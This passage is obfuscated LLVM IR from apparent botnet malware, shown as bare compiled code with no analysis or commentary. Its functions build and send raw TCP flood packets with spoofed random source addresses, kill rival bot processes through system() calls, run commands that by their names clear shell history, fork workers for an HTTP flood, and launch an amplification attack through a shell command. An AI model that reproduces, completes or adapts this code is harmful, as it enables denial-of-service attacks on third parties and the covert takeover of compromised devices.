  %146 = or i16 %136, %137
  %147 = xor i16 %146, -1
  %148 = or i16 -14033, %138
  %149 = and i16 %147, %148
  %150 = or i16 %145, %149
  %151 = or i16 %134, 80
  store i16 %150, i16* %130, align 4
  %152 = load i8*, i8** %12, align 8
  %153 = call i32 @strcmp(i8* %152, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.182, i32 0, i32 0)) #10
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %285, label %155

; <label>:155:                                    ; preds = %83
  %156 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %157 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %156, i32 0, i32 0
  %158 = bitcast %union.anon.0* %157 to %struct.anon.1*
  %159 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %158, i32 0, i32 4
  %160 = load i16, i16* %159, align 4
  %161 = xor i16 %160, -1
  %162 = xor i16 -513, -1
  %163 = xor i16 -3915, -1
  %164 = or i16 %161, %162
  %165 = or i16 -3915, %163
  %166 = xor i16 %164, -1
  %167 = and i16 %166, %165
  %168 = and i16 %160, -513
  %169 = xor i16 %167, -1
  %170 = xor i16 512, -1
  %171 = xor i16 21188, -1
  %172 = and i16 %169, 21188
  %173 = and i16 %167, %171
  %174 = and i16 %170, 21188
  %175 = and i16 512, %171
  %176 = or i16 %172, %173
  %177 = or i16 %174, %175
  %178 = xor i16 %176, %177
  %179 = or i16 %169, %170
  %180 = xor i16 %179, -1
  %181 = or i16 21188, %171
  %182 = and i16 %180, %181
  %183 = or i16 %178, %182
  %184 = or i16 %167, 512
  store i16 %183, i16* %159, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon.0* %186 to %struct.anon.1*
  %188 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = xor i16 %189, -1
  %191 = xor i16 -1025, -1
  %192 = xor i16 -9882, -1
  %193 = or i16 %190, %191
  %194 = or i16 -9882, %192
  %195 = xor i16 %193, -1
  %196 = and i16 %195, %194
  %197 = and i16 %189, -1025
  %198 = xor i16 %196, -1
  %199 = xor i16 1024, -1
  %200 = xor i16 -2272, -1
  %201 = and i16 %198, -2272
  %202 = and i16 %196, %200
  %203 = and i16 %199, -2272
  %204 = and i16 1024, %200
  %205 = or i16 %201, %202
  %206 = or i16 %203, %204
  %207 = xor i16 %205, %206
  %208 = or i16 %198, %199
  %209 = xor i16 %208, -1
  %210 = or i16 -2272, %200
  %211 = and i16 %209, %210
  %212 = or i16 %207, %211
  %213 = or i16 %196, 1024
  store i16 %212, i16* %188, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon.0* %215 to %struct.anon.1*
  %217 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -257, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -257
  %223 = xor i16 %221, -1
  %224 = xor i16 256, -1
  %225 = xor i16 22470, -1
  %226 = and i16 %223, 22470
  %227 = and i16 %221, %225
  %228 = and i16 %224, 22470
  %229 = and i16 256, %225
  %230 = or i16 %226, %227
  %231 = or i16 %228, %229
  %232 = xor i16 %230, %231
  %233 = or i16 %223, %224
  %234 = xor i16 %233, -1
  %235 = or i16 22470, %225
  %236 = and i16 %234, %235
  %237 = or i16 %232, %236
  %238 = or i16 %221, 256
  store i16 %237, i16* %217, align 4
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = xor i16 %243, -1
  %245 = xor i16 -4097, -1
  %246 = xor i16 19478, -1
  %247 = or i16 %244, %245
  %248 = or i16 19478, %246
  %249 = xor i16 %247, -1
  %250 = and i16 %249, %248
  %251 = and i16 %243, -4097
  %252 = and i16 %250, 4096
  %253 = xor i16 %250, 4096
  %254 = or i16 %252, %253
  %255 = or i16 %250, 4096
  store i16 %254, i16* %242, align 4
  %256 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon.0* %257 to %struct.anon.1*
  %259 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = xor i16 %260, -1
  %262 = xor i16 -2049, -1
  %263 = xor i16 19260, -1
  %264 = or i16 %261, %262
  %265 = or i16 19260, %263
  %266 = xor i16 %264, -1
  %267 = and i16 %266, %265
  %268 = and i16 %260, -2049
  %269 = xor i16 %267, -1
  %270 = xor i16 2048, -1
  %271 = xor i16 -7472, -1
  %272 = and i16 %269, -7472
  %273 = and i16 %267, %271
  %274 = and i16 %270, -7472
  %275 = and i16 2048, %271
  %276 = or i16 %272, %273
  %277 = or i16 %274, %275
  %278 = xor i16 %276, %277
  %279 = or i16 %269, %270
  %280 = xor i16 %279, -1
  %281 = or i16 -7472, %271
  %282 = and i16 %280, %281
  %283 = or i16 %278, %282
  %284 = or i16 %267, 2048
  store i16 %283, i16* %259, align 4
  br label %432

; <label>:285:                                    ; preds = %83
  %286 = load i8*, i8** %12, align 8
  %287 = call i8* @strtok(i8* %286, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %287, i8** %23, align 8
  br label %288

; <label>:288:                                    ; preds = %429, %285
  %289 = load i8*, i8** %23, align 8
  %290 = icmp ne i8* %289, null
  br i1 %290, label %291, label %431

; <label>:291:                                    ; preds = %288
  %292 = load i8*, i8** %23, align 8
  %293 = call i32 @strcmp(i8* %292, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #10
  %294 = icmp ne i32 %293, 0
  br i1 %294, label %321, label %295

; <label>:295:                                    ; preds = %291
  %296 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 0
  %298 = bitcast %union.anon.0* %297 to %struct.anon.1*
  %299 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %298, i32 0, i32 4
  %300 = load i16, i16* %299, align 4
  %301 = xor i16 -513, -1
  %302 = xor i16 %300, %301
  %303 = and i16 %302, %300
  %304 = and i16 %300, -513
  %305 = xor i16 %303, -1
  %306 = xor i16 512, -1
  %307 = xor i16 -7692, -1
  %308 = and i16 %305, -7692
  %309 = and i16 %303, %307
  %310 = and i16 %306, -7692
  %311 = and i16 512, %307
  %312 = or i16 %308, %309
  %313 = or i16 %310, %311
  %314 = xor i16 %312, %313
  %315 = or i16 %305, %306
  %316 = xor i16 %315, -1
  %317 = or i16 -7692, %307
  %318 = and i16 %316, %317
  %319 = or i16 %314, %318
  %320 = or i16 %303, 512
  store i16 %319, i16* %299, align 4
  br label %429

; <label>:321:                                    ; preds = %291
  %322 = load i8*, i8** %23, align 8
  %323 = call i32 @strcmp(i8* %322, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i32 0, i32 0)) #10
  %324 = icmp ne i32 %323, 0
  br i1 %324, label %339, label %325

; <label>:325:                                    ; preds = %321
  %326 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %327 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon.0* %327 to %struct.anon.1*
  %329 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %328, i32 0, i32 4
  %330 = load i16, i16* %329, align 4
  %331 = xor i16 -1025, -1
  %332 = xor i16 %330, %331
  %333 = and i16 %332, %330
  %334 = and i16 %330, -1025
  %335 = and i16 %333, 1024
  %336 = xor i16 %333, 1024
  %337 = or i16 %335, %336
  %338 = or i16 %333, 1024
  store i16 %337, i16* %329, align 4
  br label %428

; <label>:339:                                    ; preds = %321
  %340 = load i8*, i8** %23, align 8
  %341 = call i32 @strcmp(i8* %340, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.186, i32 0, i32 0)) #10
  %342 = icmp ne i32 %341, 0
  br i1 %342, label %369, label %343

; <label>:343:                                    ; preds = %339
  %344 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %345 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %344, i32 0, i32 0
  %346 = bitcast %union.anon.0* %345 to %struct.anon.1*
  %347 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %346, i32 0, i32 4
  %348 = load i16, i16* %347, align 4
  %349 = xor i16 -257, -1
  %350 = xor i16 %348, %349
  %351 = and i16 %350, %348
  %352 = and i16 %348, -257
  %353 = xor i16 %351, -1
  %354 = xor i16 256, -1
  %355 = xor i16 -22610, -1
  %356 = and i16 %353, -22610
  %357 = and i16 %351, %355
  %358 = and i16 %354, -22610
  %359 = and i16 256, %355
  %360 = or i16 %356, %357
  %361 = or i16 %358, %359
  %362 = xor i16 %360, %361
  %363 = or i16 %353, %354
  %364 = xor i16 %363, -1
  %365 = or i16 -22610, %355
  %366 = and i16 %364, %365
  %367 = or i16 %362, %366
  %368 = or i16 %351, 256
  store i16 %367, i16* %347, align 4
  br label %427

; <label>:369:                                    ; preds = %339
  %370 = load i8*, i8** %23, align 8
  %371 = call i32 @strcmp(i8* %370, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.187, i32 0, i32 0)) #10
  %372 = icmp ne i32 %371, 0
  br i1 %372, label %399, label %373

; <label>:373:                                    ; preds = %369
  %374 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 0
  %376 = bitcast %union.anon.0* %375 to %struct.anon.1*
  %377 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 4
  %379 = xor i16 -4097, -1
  %380 = xor i16 %378, %379
  %381 = and i16 %380, %378
  %382 = and i16 %378, -4097
  %383 = xor i16 %381, -1
  %384 = xor i16 4096, -1
  %385 = xor i16 -8991, -1
  %386 = and i16 %383, -8991
  %387 = and i16 %381, %385
  %388 = and i16 %384, -8991
  %389 = and i16 4096, %385
  %390 = or i16 %386, %387
  %391 = or i16 %388, %389
  %392 = xor i16 %390, %391
  %393 = or i16 %383, %384
  %394 = xor i16 %393, -1
  %395 = or i16 -8991, %385
  %396 = and i16 %394, %395
  %397 = or i16 %392, %396
  %398 = or i16 %381, 4096
  store i16 %397, i16* %377, align 4
  br label %426

; <label>:399:                                    ; preds = %369
  %400 = load i8*, i8** %23, align 8
  %401 = call i32 @strcmp(i8* %400, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i32 0, i32 0)) #10
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %421, label %403

; <label>:403:                                    ; preds = %399
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon.0* %405 to %struct.anon.1*
  %407 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = xor i16 %408, -1
  %410 = xor i16 -2049, -1
  %411 = xor i16 -25965, -1
  %412 = or i16 %409, %410
  %413 = or i16 -25965, %411
  %414 = xor i16 %412, -1
  %415 = and i16 %414, %413
  %416 = and i16 %408, -2049
  %417 = and i16 %415, 2048
  %418 = xor i16 %415, 2048
  %419 = or i16 %417, %418
  %420 = or i16 %415, 2048
  store i16 %419, i16* %407, align 4
  br label %425

; <label>:421:                                    ; preds = %399
  %422 = load i32, i32* @mainCommSock, align 4
  %423 = load i8*, i8** %23, align 8
  %424 = call i32 (i32, i8*, ...) @sockprintf(i32 %422, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.189, i32 0, i32 0), i8* %423)
  br label %425

; <label>:425:                                    ; preds = %421, %403
  br label %426

; <label>:426:                                    ; preds = %425, %373
  br label %427

; <label>:427:                                    ; preds = %426, %343
  br label %428

; <label>:428:                                    ; preds = %427, %325
  br label %429

; <label>:429:                                    ; preds = %428, %295
  %430 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %430, i8** %23, align 8
  br label %288

; <label>:431:                                    ; preds = %288
  br label %432

; <label>:432:                                    ; preds = %431, %155
  %433 = call i32 @rand_cmwc()
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon.0* %436 to %struct.anon.1*
  %438 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %437, i32 0, i32 5
  store i16 %434, i16* %438, align 2
  %439 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %440 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %439, i32 0, i32 0
  %441 = bitcast %union.anon.0* %440 to %struct.anon.1*
  %442 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %441, i32 0, i32 6
  store i16 0, i16* %442, align 4
  %443 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %444 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %443, i32 0, i32 0
  %445 = bitcast %union.anon.0* %444 to %struct.anon.1*
  %446 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %445, i32 0, i32 7
  store i16 0, i16* %446, align 2
  %447 = load i32, i32* %9, align 4
  %448 = icmp eq i32 %447, 0
  br i1 %448, label %449, label %451

; <label>:449:                                    ; preds = %432
  %450 = call i32 @rand_cmwc()
  br label %456

; <label>:451:                                    ; preds = %432
  %452 = load i32, i32* %9, align 4
  %453 = trunc i32 %452 to i16
  %454 = call zeroext i16 @htons(i16 zeroext %453) #13
  %455 = zext i16 %454 to i32
  br label %456

; <label>:456:                                    ; preds = %451, %449
  %457 = phi i32 [ %450, %449 ], [ %455, %451 ]
  %458 = trunc i32 %457 to i16
  %459 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon.0* %460 to %struct.anon.1*
  %462 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %461, i32 0, i32 1
  store i16 %458, i16* %462, align 2
  %463 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %464 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %465 = call zeroext i16 @tcpcsum(%struct.iphdr* %463, %struct.tcphdr* %464)
  %466 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon.0* %467 to %struct.anon.1*
  %469 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %468, i32 0, i32 6
  store i16 %465, i16* %469, align 4
  %470 = bitcast i8* %91 to i16*
  %471 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 2
  %473 = load i16, i16* %472, align 2
  %474 = zext i16 %473 to i32
  %475 = call zeroext i16 @csum(i16* %470, i32 %474)
  %476 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 7
  store i16 %475, i16* %477, align 2
  %478 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %479 = load i32, i32* %10, align 4
  %480 = add i32 %478, -1825010230
  %481 = add i32 %480, %479
  %482 = sub i32 %481, -1825010230
  %483 = add nsw i32 %478, %479
  store i32 %482, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %484

; <label>:484:                                    ; preds = %537, %536, %456
  br label %485

; <label>:485:                                    ; preds = %484
  %486 = load i32, i32* %17, align 4
  %487 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %488 = call i64 @sendto(i32 %486, i8* %91, i64 %88, i32 0, %struct.sockaddr* %487, i32 16)
  %489 = load i32, i32* %19, align 4
  %490 = call i32 @GetRandomIP(i32 %489)
  %491 = call i32 @htonl(i32 %490) #13
  %492 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %493 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %492, i32 0, i32 8
  store i32 %491, i32* %493, align 4
  %494 = call i32 @rand_cmwc()
  %495 = trunc i32 %494 to i16
  %496 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %497 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %496, i32 0, i32 3
  store i16 %495, i16* %497, align 4
  %498 = call i32 @rand_cmwc()
  %499 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon.0* %500 to %struct.anon.1*
  %502 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %501, i32 0, i32 2
  store i32 %498, i32* %502, align 4
  %503 = call i32 @rand_cmwc()
  %504 = trunc i32 %503 to i16
  %505 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %506 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %505, i32 0, i32 0
  %507 = bitcast %union.anon.0* %506 to %struct.anon.1*
  %508 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %507, i32 0, i32 0
  store i16 %504, i16* %508, align 4
  %509 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 0
  %511 = bitcast %union.anon.0* %510 to %struct.anon.1*
  %512 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %511, i32 0, i32 6
  store i16 0, i16* %512, align 4
  %513 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %514 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %515 = call zeroext i16 @tcpcsum(%struct.iphdr* %513, %struct.tcphdr* %514)
  %516 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 0
  %518 = bitcast %union.anon.0* %517 to %struct.anon.1*
  %519 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %518, i32 0, i32 6
  store i16 %515, i16* %519, align 4
  %520 = bitcast i8* %91 to i16*
  %521 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 2
  %523 = load i16, i16* %522, align 2
  %524 = zext i16 %523 to i32
  %525 = call zeroext i16 @csum(i16* %520, i32 %524)
  %526 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 7
  store i16 %525, i16* %527, align 2
  %528 = load i32, i32* %25, align 4
  %529 = load i32, i32* %15, align 4
  %530 = icmp eq i32 %528, %529
  br i1 %530, label %531, label %537

; <label>:531:                                    ; preds = %485
  %532 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %533 = load i32, i32* %24, align 4
  %534 = icmp sgt i32 %532, %533
  br i1 %534, label %535, label %536

; <label>:535:                                    ; preds = %531
  br label %544

; <label>:536:                                    ; preds = %531
  store i32 0, i32* %25, align 4
  br label %484

; <label>:537:                                    ; preds = %485
  %538 = load i32, i32* %25, align 4
  %539 = sub i32 0, %538
  %540 = sub i32 0, 1
  %541 = add i32 %539, %540
  %542 = sub i32 0, %541
  %543 = add i32 %538, 1
  store i32 %542, i32* %25, align 4
  br label %484

; <label>:544:                                    ; preds = %535
  %545 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %545)
  br label %546

; <label>:546:                                    ; preds = %544, %59, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

; <label>:3:                                      ; preds = %36, %0
  store i32 0, i32* %1, align 4
  br label %4

; <label>:4:                                      ; preds = %30, %3
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  br i1 %6, label %7, label %36

; <label>:7:                                      ; preds = %4
  %8 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* %8, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.190, i32 0, i32 0)) #2
  %10 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %11 = load i32, i32* %1, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strcat(i8* %10, i8* %14) #2
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %17 = call i32 @system(i8* %16)
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* %1, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcat(i8* %20, i8* %24) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strcat(i8* %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0)) #2
  %28 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %29 = call i32 @system(i8* %28)
  br label %30

; <label>:30:                                     ; preds = %7
  %31 = load i32, i32* %1, align 4
  %32 = add i32 %31, -1424810293
  %33 = add i32 %32, 1
  %34 = sub i32 %33, -1424810293
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %1, align 4
  br label %4

; <label>:36:                                     ; preds = %4
  %37 = call i32 @sleep(i32 5)
  br label %3
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

declare i32 @system(i8*) #3

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [649 x i8*], align 16
  %14 = alloca [3 x i8*], align 16
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = bitcast [649 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %19, i8* bitcast ([649 x i8*]* @sendHTTP.useragents to i8*), i64 5192, i32 16, i1 false)
  %20 = bitcast [3 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %20, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 %21, %23
  %25 = add nsw i32 %21, %22
  store i32 %24, i32* %16, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %27 = load i8*, i8** %8, align 8
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @rand() #2
  %30 = srem i32 %29, 30
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds [3 x i8*], [3 x i8*]* %14, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @rand() #2
  %35 = srem i32 %34, 674
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [649 x i8*], [649 x i8*]* %13, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 (i8*, i8*, ...) @sprintf(i8* %26, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.501, i32 0, i32 0), i8* %27, i8* %28, i8* %33, i8* %38) #2
  store i32 0, i32* %15, align 4
  br label %40

; <label>:40:                                     ; preds = %69, %6
  %41 = load i32, i32* %15, align 4
  %42 = load i32, i32* %12, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %75

; <label>:44:                                     ; preds = %40
  %45 = call i32 @fork() #2
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %68

; <label>:47:                                     ; preds = %44
  br label %48

; <label>:48:                                     ; preds = %66, %47
  %49 = load i32, i32* %16, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %67

; <label>:52:                                     ; preds = %48
  %53 = load i8*, i8** %7, align 8
  %54 = load i16, i16* %9, align 2
  %55 = call i32 @socket_connect(i8* %53, i16 zeroext %54)
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %18, align 4
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %58, label %66

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %18, align 4
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %62 = call i64 @strlen(i8* %61) #10
  %63 = call i64 @write(i32 %59, i8* %60, i64 %62)
  %64 = load i32, i32* %18, align 4
  %65 = call i32 @close(i32 %64)
  br label %66

; <label>:66:                                     ; preds = %58, %52
  br label %48

; <label>:67:                                     ; preds = %48
  call void @_exit(i32 1) #12
  unreachable

; <label>:68:                                     ; preds = %44
  br label %69

; <label>:69:                                     ; preds = %68
  %70 = load i32, i32* %15, align 4
  %71 = add i32 %70, 1798409852
  %72 = add i32 %71, 1
  %73 = sub i32 %72, 1798409852
  %74 = add nsw i32 %70, 1
  store i32 %73, i32* %15, align 4
  br label %40

; <label>:75:                                     ; preds = %40
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @senditbudAMP(i8*, i8*, i8*, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca [128 x i8], align 16
  %12 = alloca [128 x i8], align 16
  %13 = alloca [128 x i8], align 16
  %14 = alloca [128 x i8], align 16
  %15 = alloca [128 x i8], align 16
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @strcmp(i8* %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i32 0, i32 0)) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %27, label %19

; <label>:19:                                     ; preds = %4
  %20 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %21 = load i8*, i8** %6, align 8
  %22 = load i8*, i8** %7, align 8
  %23 = load i8*, i8** %8, align 8
  %24 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %20, i64 128, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.503, i32 0, i32 0), i8* %21, i8* %22, i8* %23) #2
  %25 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i32 0, i32 0
  %26 = call i32 @system(i8* %25)
  br label %27

; <label>:27:                                     ; preds = %19, %4
  %28 = load i8*, i8** %5, align 8
  %29 = call i32 @strcmp(i8* %28, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i32 0, i32 0)) #10
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %39, label %31

; <label>:31:                                     ; preds = %27
